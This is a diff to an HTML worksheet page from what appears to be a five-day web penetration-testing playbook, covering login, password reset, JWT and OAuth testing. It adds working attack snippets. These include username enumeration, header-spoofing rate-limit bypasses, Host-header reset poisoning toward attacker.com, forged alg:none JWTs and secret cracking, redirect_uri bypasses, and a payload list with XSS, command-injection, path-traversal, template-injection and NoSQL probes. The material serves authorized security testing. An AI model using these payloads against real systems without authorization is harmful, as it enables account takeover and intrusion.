@@ -11,7 +11,7 @@
   <link rel="stylesheet" href="../vulns/style.css">
   <title>Day 2 Worksheet · Auth + Input Probes · Web Pentest Playbook</title>
 </head>
-<body data-day="day2" style="--day-color: var(--warn)">
+<body data-day="day2" data-day-num="2" style="--day-color: var(--warn)">
 
 <svg class="icon-sprite" aria-hidden="true" xmlns="http://www.w3.org/2000/svg">
   <defs>
@@ -44,7 +44,7 @@
 <div class="content-wrap" style="padding-top:2rem">
 
   <div class="day-page-hero">
-    <div class="day-num">Worksheet · Day 2 of 5</div>
+    <div class="day-num">Worksheet · Day 2 of 5 · <span data-day-date class="day-date-display unset">— pick start date below ↓</span></div>
     <h1>
       <span class="day-icon-pill"><svg class="icon" aria-hidden="true"><use href="#icon-key"/></svg></span>
       Auth, Authorization &amp; Input Probes
@@ -64,10 +64,35 @@
       <label for="t-from-day1">Day-1 leads to follow up here</label>
       <textarea id="t-from-day1" data-key="text-from-day1" placeholder="- /api/users/{id} numeric IDOR candidate&#10;- JWT in Authorization header — alg HS256&#10;- /reset uses Host header"></textarea>
     </div>
+    <div class="form-group">
+      <label for="t-startdate">Engagement start date · Day 1</label>
+      <input type="date" id="t-startdate" data-key="shared.startDate">
+      <p class="form-hint">Sets the calendar date for all 5 worksheet pages. Editable from any day.</p>
+    </div>
   </section>
 
   <section class="worksheet-section" id="login">
     <h2><span class="ws-section-num">2</span>Login Flow &amp; Registration</h2>
+    <pre class="snippet"><span class="snippet-label">Username enumeration via response-size diff</span><code>ffuf -u https://example.com/login \
+  -X POST -d "username=FUZZ&amp;password=any" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -w usernames.txt \
+  -fs 1234   # filter by size of the "no such user" response, keep diffs</code></pre>
+
+    <pre class="snippet"><span class="snippet-label">Rate-limit bypass attempts</span><code># 1. X-Forwarded-For / IP-spoof headers
+for ip in 127.0.0.1 1.1.1.1 attacker; do
+  curl -X POST https://example.com/login \
+    -H "X-Forwarded-For: $ip" \
+    -H "X-Real-IP: $ip" \
+    -H "X-Originating-IP: $ip" \
+    -d "username=admin&amp;password=guess$RANDOM"
+done
+
+# 2. Casing / path tricks (some WAFs key by exact path)
+curl -X POST https://example.com/Login    # capital L
+curl -X POST https://example.com/login/   # trailing slash
+curl -X POST https://example.com/login%20 # %20 suffix</code></pre>
+
     <ul class="task-list">
       <li><input type="checkbox" data-key="check-login-flow"><span class="task-label">Map the login flow: form fields, redirect chain, cookies set, response timing</span></li>
       <li><input type="checkbox" data-key="check-login-userenum"><span class="task-label">Username enumeration via response diff (timing, error message, status code) on login + registration + reset</span></li>
@@ -81,6 +106,13 @@
 
   <section class="worksheet-section" id="reset">
     <h2><span class="ws-section-num">3</span>Password Reset Flow</h2>
+    <pre class="snippet"><span class="snippet-label">Host-header poisoning on password reset</span><code>curl -sk -X POST https://example.com/forgot-password \
+  -H "Host: attacker.com" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "email=victim@example.com"
+# Watch for the reset link in the email referencing attacker.com.
+# Also try: X-Forwarded-Host, X-Forwarded-Server, X-Original-Host</code></pre>
+
     <ul class="task-list">
       <li><input type="checkbox" data-key="check-reset-token-entropy"><span class="task-label">Token entropy — request 5+ tokens, check for predictability (sequential, time-based, weak hash)</span></li>
       <li><input type="checkbox" data-key="check-reset-token-expiry"><span class="task-label">Token expiry — does it actually expire? Reuse after first use?</span></li>
@@ -105,6 +137,33 @@
 
   <section class="worksheet-section" id="jwt">
     <h2><span class="ws-section-num">5</span>JWT Inspection</h2>
+    <pre class="snippet"><span class="snippet-label">Decode + claims inspection</span><code># Quick decode (no signature check):
+echo "&lt;JWT&gt;" | cut -d. -f1 | base64 -d 2&gt;/dev/null
+echo "&lt;JWT&gt;" | cut -d. -f2 | base64 -d 2&gt;/dev/null
+
+# With jwt_tool (full):
+jwt_tool "&lt;JWT&gt;"
+jwt_tool "&lt;JWT&gt;" -t https://example.com/api -rh "Authorization: Bearer &lt;JWT&gt;"</code></pre>
+
+    <pre class="snippet"><span class="snippet-label">alg:none attack</span><code>jwt_tool "&lt;JWT&gt;" -X a
+# Or manually: change alg to "none", drop the signature, re-encode.
+python3 -c "
+import base64, json
+hdr = {'alg':'none','typ':'JWT'}
+pl  = {'sub':'admin','role':'admin'}
+b64 = lambda d: base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode()
+print(f'{b64(hdr)}.{b64(pl)}.')
+"</code></pre>
+
+    <pre class="snippet"><span class="snippet-label">Algorithm confusion (RS256 → HS256)</span><code># 1. Pull the public key (often /.well-known/jwks.json)
+curl -s https://example.com/.well-known/jwks.json
+# 2. Convert JWK to PEM, then sign with the public key as the HMAC secret
+jwt_tool "&lt;JWT&gt;" -X k -pk pubkey.pem</code></pre>
+
+    <pre class="snippet"><span class="snippet-label">Brute-force weak HMAC secret</span><code>hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
+# Or with john:
+john --format=HMAC-SHA256 jwt.txt</code></pre>
+
     <p class="ws-intro">Decode every JWT you see. Use jwt.io or <code>jwt_tool -t &lt;url&gt; -rh "Authorization: Bearer &lt;jwt&gt;"</code>.</p>
     <ul class="task-list">
       <li><input type="checkbox" data-key="check-jwt-decode"><span class="task-label">Decode header + payload — note algorithm, claims, expiry</span></li>
@@ -123,6 +182,16 @@
 
   <section class="worksheet-section" id="oauth">
     <h2><span class="ws-section-num">6</span>OAuth / OIDC</h2>
+    <pre class="snippet"><span class="snippet-label">redirect_uri parser-confusion battery</span><code># Test these one by one in a real OAuth login button:
+?redirect_uri=https://attacker.com
+?redirect_uri=//attacker.com
+?redirect_uri=/\attacker.com
+?redirect_uri=https://example.com.attacker.com
+?redirect_uri=https://example.com@attacker.com
+?redirect_uri=https://example.com#@attacker.com
+?redirect_uri=https://example.com/../redirect
+# Also try mixed-case: https://EXAMPLE.com  (some validators are case-sensitive)</code></pre>
+
     <ul class="task-list">
       <li><input type="checkbox" data-key="check-oauth-state"><span class="task-label"><code>state</code> parameter present and validated (drop it — does login still complete?)</span></li>
       <li><input type="checkbox" data-key="check-oauth-redirect"><span class="task-label"><code>redirect_uri</code> strict matching: try <code>?redirect_uri=evil.com</code>, <code>target.com.evil.com</code>, <code>target.com/../</code></span></li>
@@ -149,6 +218,28 @@
   <section class="worksheet-section" id="probes">
     <h2><span class="ws-section-num">8</span>Input Probes (the canary set)</h2>
     <p class="ws-intro">Drop one of each into every parameter. Looking for SIGNALS, not exploitation. Tick the canary once you've sprayed it.</p>
+    <pre class="snippet"><span class="snippet-label">Canary set — load into Burp Intruder payload list</span><code>'
+"
+&amp;apos;||&amp;apos;
+&amp;lt;svg/onload=alert(1)&amp;gt;
+"&amp;gt;&amp;lt;svg/onload=alert(1)&amp;gt;
+&amp;apos;&amp;gt;&amp;lt;svg/onload=alert(1)&amp;gt;
+&amp;apos;-alert(1)-&amp;apos;
+\&amp;apos;;alert(1);//
+; sleep 5
+$(sleep 5)
+| sleep 5
+` sleep 5 `
+../../../../etc/passwd
+....//....//....//etc/passwd
+{{7*7}}
+${7*7}
+&amp;lt;%= 7*7 %&amp;gt;
+{{constructor.constructor(&amp;apos;alert(1)&amp;apos;)()}}
+{"$ne":null}
+{"$gt":""}
+http://collaborator.your.domain</code></pre>
+
     <ul class="task-list">
       <li><input type="checkbox" data-key="check-probe-sqli"><span class="task-label"><code>'</code> — SQLi signal? (look for 500, error message, response diff)</span></li>
       <li><input type="checkbox" data-key="check-probe-xss"><span class="task-label"><code>&lt;svg/onload=alert(1)&gt;</code> — XSS reflection? (raw, in attribute, inside JSON?)</span></li>
